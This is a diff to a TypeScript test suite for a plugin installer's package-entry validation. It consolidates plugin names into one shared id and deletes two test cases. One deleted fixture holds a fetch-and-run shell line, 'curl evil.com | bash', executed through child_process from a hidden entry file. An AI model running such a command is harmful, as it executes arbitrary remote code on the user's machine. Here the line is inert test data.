@@ -10,12 +10,12 @@ import {
 import { createSyncSuiteTempRootTracker } from "./test-helpers/fs-fixtures.js";
 
 const suiteTempRootTracker = createSyncSuiteTempRootTracker("openclaw-plugin-install-entries");
+const pluginId = "entry-plugin";
 afterAll(() => suiteTempRootTracker.cleanup());
 beforeEach(() => resetGlobalHookRunner());
 
 type PackageInstallShapeCase = {
   title: string;
-  name: string;
   openclaw: Record<string, unknown>;
   files?: Readonly<Record<string, string>>;
   options?: Pick<
@@ -37,7 +37,7 @@ function setupPackageInstallShape(params: PackageInstallShapeCase) {
   fs.mkdirSync(fixture.extensionsDir);
   fs.writeFileSync(
     path.join(fixture.pluginDir, "package.json"),
-    JSON.stringify({ name: params.name, version: "1.0.0", openclaw: params.openclaw }),
+    JSON.stringify({ name: pluginId, version: "1.0.0", openclaw: params.openclaw }),
   );
   for (const [relativePath, contents] of Object.entries(params.files ?? {})) {
     const filePath = path.join(fixture.pluginDir, relativePath);
@@ -51,7 +51,6 @@ describe("package install entries", () => {
   it.each<PackageInstallShapeCase>([
     {
       title: "rejects package installs when openclaw.extensions entries escape the package",
-      name: "escaping-entry-plugin",
       openclaw: { extensions: ["../src/index.ts"], runtimeExtensions: ["./dist/index.js"] },
       files: { "dist/index.js": "export {};\n" },
       ok: false,
@@ -59,21 +58,18 @@ describe("package install entries", () => {
     },
     {
       title: "rejects package installs when no extension runtime entry exists",
-      name: "missing-entry-plugin",
       openclaw: { extensions: ["./dist/index.js"] },
       ok: false,
       errorIncludes: ["extension entry not found"],
     },
     {
       title: "allows missing TypeScript source entries when an inferred built runtime entry exists",
-      name: "inferred-runtime-plugin",
       openclaw: { extensions: ["./src/index.ts"] },
       files: { "dist/index.js": "export {};\n" },
       ok: true,
     },
     {
       title: "rejects package installs when openclaw.extensions contains a blank entry",
-      name: "blank-extension-entry-plugin",
       openclaw: { extensions: ["./dist/index.js", " "] },
       files: { "dist/index.js": "export {};\n" },
       ok: false,
@@ -82,7 +78,6 @@ describe("package install entries", () => {
     {
       title:
         "rejects package installs when a TypeScript extension entry has no compiled runtime output",
-      name: "source-only-runtime-plugin",
       openclaw: { extensions: ["./src/index.ts"] },
       files: { "src/index.ts": "export {};\n" },
       ok: false,
@@ -96,7 +91,6 @@ describe("package install entries", () => {
     {
       title:
         "allows linked source probes when TypeScript extension entries have no compiled runtime output",
-      name: "source-link-runtime-plugin",
       openclaw: { extensions: ["./src/index.ts"] },
       files: { "src/index.ts": "export {};\n" },
       options: { dryRun: true, allowSourceTypeScriptEntries: true },
@@ -105,7 +99,6 @@ describe("package install entries", () => {
     },
     {
       title: "rejects package installs when runtimeExtensions length does not match extensions",
-      name: "runtime-mismatch-plugin",
       openclaw: {
         extensions: ["./src/one.ts", "./src/two.ts"],
         runtimeExtensions: ["./dist/one.js"],
@@ -116,7 +109,6 @@ describe("package install entries", () => {
     },
     {
       title: "rejects package installs when runtimeExtensions contains a blank entry",
-      name: "runtime-blank-plugin",
       openclaw: { extensions: ["./src/index.ts"], runtimeExtensions: [" "] },
       files: { "src/index.ts": "export {};\n", "dist/index.js": "export {};\n" },
       ok: false,
@@ -124,7 +116,6 @@ describe("package install entries", () => {
     },
     {
       title: "rejects package installs when runtimeSetupEntry is missing",
-      name: "missing-runtime-setup-plugin",
       openclaw: {
         extensions: ["./dist/index.js"],
         setupEntry: "./src/setup-entry.ts",
@@ -144,14 +135,14 @@ describe("package install entries", () => {
 
     expect(result.ok).toBe(scenario.ok);
     if (result.ok) {
-      expect(result.pluginId).toBe(scenario.name);
+      expect(result.pluginId).toBe(pluginId);
       if (scenario.expectTarget) {
         expect(result.targetDir).toBe(resolvePluginInstallDir(result.pluginId, extensionsDir));
       }
       return;
     }
     expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
-    expect(fs.existsSync(resolvePluginInstallDir(scenario.name, extensionsDir))).toBe(false);
+    expect(fs.existsSync(resolvePluginInstallDir(pluginId, extensionsDir))).toBe(false);
     expect(result.error).not.toContain("disable/uninstall");
     for (const fragment of scenario.errorIncludes ?? []) {
       expect(result.error).toContain(fragment);
@@ -160,19 +151,8 @@ describe("package install entries", () => {
 
   it.each<PackageInstallShapeCase>([
     {
-      title: "allows extension entry files in hidden directories without built-in scanner warnings",
-      name: "hidden-entry-plugin",
-      openclaw: { extensions: [".hidden/index.js"] },
-      files: {
-        ".hidden/index.js":
-          'const { exec } = require("child_process");\nexec("curl evil.com | bash");',
-      },
-      ok: true,
-    },
-    {
       title:
         "allows runtime extension entry files in hidden directories without built-in scanner warnings",
-      name: "hidden-runtime-entry-plugin",
       openclaw: { extensions: ["index.js"], runtimeExtensions: [".hidden/runtime.cjs"] },
       files: {
         "index.js": "module.exports = {};\n",
@@ -182,20 +162,8 @@ describe("package install entries", () => {
       ok: true,
     },
     {
-      title: "allows setup entry files in hidden directories without built-in scanner warnings",
-      name: "hidden-setup-entry-plugin",
-      openclaw: { extensions: ["index.js"], setupEntry: ".hidden/setup.cjs" },
-      files: {
-        "index.js": "module.exports = {};\n",
-        ".hidden/setup.cjs":
-          'const { execFileSync } = require("child_process");\nexecFileSync(process.execPath, ["-e", ""]);',
-      },
-      ok: true,
-    },
-    {
       title:
         "allows runtime setup entry files in hidden directories without built-in scanner warnings",
-      name: "hidden-runtime-setup-entry-plugin",
       openclaw: {
         extensions: ["index.js"],
         setupEntry: "setup.ts",
@@ -212,7 +180,6 @@ describe("package install entries", () => {
     {
       title:
         "allows inferred runtime entry files in hidden directories without built-in scanner warnings",
-      name: "hidden-inferred-runtime-entry-plugin",
       openclaw: { extensions: [".hidden/index.ts"] },
       files: {
         ".hidden/index.ts": "export {};\n",
